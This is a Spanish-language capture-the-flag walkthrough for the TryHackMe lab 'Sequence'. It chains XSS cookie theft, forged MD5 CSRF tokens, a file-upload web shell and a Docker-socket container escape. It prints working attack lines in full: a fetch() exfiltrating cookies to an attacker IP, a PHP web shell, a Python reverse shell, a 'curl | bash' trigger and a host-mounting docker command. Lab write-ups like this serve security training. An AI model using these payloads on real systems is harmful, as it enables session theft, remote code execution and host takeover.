# Sequence [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** MEDIUM.
* **Tipo / Type:** Premium (requiere suscripción).
* **Slug:** `sequence`
* **Link:** https://tryhackme.com/room/sequence
* **Fuente / Source:** [Jery0843/TryHackMe](https://github.com/Jery0843/TryHackMe)

---

## Solucionario de Tareas / Task Solutions

### Setup & Reconocimiento Inicial

```bash
echo "10.10.195.11 review.thm" | sudo tee -a /etc/hosts
cd ~/www
python3 -m http.server 80

nmap -T4 -n -sC -sV -Pn -p- review.thm
```

**Servicios observados:**
```
22/tcp: SSH (OpenSSH 8.2p1)
80/tcp: HTTP (Apache 2.4.41)
```

Fuzzing de endpoints ocultos:
```bash
ffuf -u 'http://review.thm/FUZZ' \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -e .php -mc all -t 100 -fc 404 -ic
```

Se descubren `/mail/`, `/login.php`, y `/contact.php`.

`http://review.thm/mail/dump.txt` revela:
```
Finance panel: /finance.php (internal 192.x network)
Lottery panel: /lottery.php
Password: S60u}f5j
```

### Fase 1 - XSS a Moderator

**1. Crear y alojar payload XSS** (`test.js`):
```bash
cat > ~/www/test.js << 'EOF'
fetch("http://YOUR_IP/?c=" + document.cookie)
EOF
```

**2. Inyectar en el formulario de contacto** (`/contact.php`):
- Name: attacker
- Email: a@a.com
- Message:
```html
<script src="http://YOUR_IP/test.js"></script>
```

**3. Capturar y usar la sesión del moderator.** El log del servidor muestra la cookie:
```
GET /?c=PHPSESSID=k73b004qihakut11s5lv4s32lc HTTP/1.1
```

Reemplazar tu cookie `PHPSESSID` por este valor. La vista de moderator muestra:
```
Flag#1: THM{xxxxxxxxxxxxxxxx}
```

### Fase 2 - Moderator a Admin vía CSRF

**1. Inspeccionar token CSRF** en `/settings.php`:
```html
<input type="hidden" name="csrf_token_promote" value="ad148a3ca8bd0ef3b48c52454c493ec5">
```

**2. Decodificar patrón del token** (MD5):
```bash
echo -n 'mod' | md5sum
# ad148a3ca8bd0ef3b48c52454c493ec5

echo -n 'admin' | md5sum
# 21232f297a57a5a743894a0e4a801fc3
```

**3. Enviar link de promoción** desde el chat del moderator (`/chat.php`):
```
http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3
```

**4. Re-login como mod:** cambiar la contraseña, salir, y entrar de nuevo como `mod`. La sesión escala a **admin**:
```
Flag#2: THM{yyyyyyyyyyyyyyyy}
```

### Fase 3 - Acceso al Panel de Finanzas

En `/dashboard.php`, interceptar la petición POST al pulsar "Lottery" y modificar:
```
feature=lottery.php  →  feature=finance.php
```

Al pedir la contraseña del panel de finanzas, ingresar:
```
S60u}f5j
```

### Fase 4 - Upload de Archivo y Shell

**1. Crear y subir web shell** vía el panel de finanzas:
```bash
cat > shell.php << 'EOF'
<?php system($_GET["cmd"]); ?>
EOF
```

**2. Testear ejecución de comandos:**
```
http://review.thm/uploads/shell.php?cmd=id
```

El output confirma ejecución como **root** dentro del contenedor Docker:
```
uid=0(root) gid=0(root) groups=0(root)
```

### Fase 5 - Escape de Contenedor y Flag de Root

**1. Lanzar reverse shell:**
```bash
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("YOUR_IP",443));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty;pty.spawn("sh")'
```

Listener:
```bash
nc -lvnp 443
```

Trigger vía web shell:
```
http://review.thm/uploads/shell.php?cmd=curl%20YOUR_IP%20|%20bash
```

**2. Escapar vía Docker socket** (confirmar presencia):
```bash
ls -la /var/run/docker.sock
```

Correr contenedor privilegiado con el filesystem del host montado:
```bash
docker run -v /:/mnt --rm -it php:8.1-cli bash
```

**3. Recuperar la flag de root del host:**
```bash
ls -l /mnt/root/
cat /mnt/root/flag.txt
```

```
Flag#3: THM{zzzzzzzzzzzzzzzzzz}
```

### Recapitulación de Flags

- **Flag 1 (acceso mod):** `THM{xxxxxxxxxxxxxxxx}`
- **Flag 2 (acceso admin):** `THM{yyyyyyyyyyyyyyyy}`
- **Flag 3 (acceso root):** `THM{zzzzzzzzzzzzzzzzzz}`

La cadena: **XSS** → secuestro de sesión, abuso de **tokens CSRF estáticos** → escalada de privilegios, **upload inseguro de archivos** → ejecución de código, y **Docker socket montado** → escape de contenedor.

---

*Documentación para propósitos educativos y registro de CTF. Fuente: writeup público verificado.*
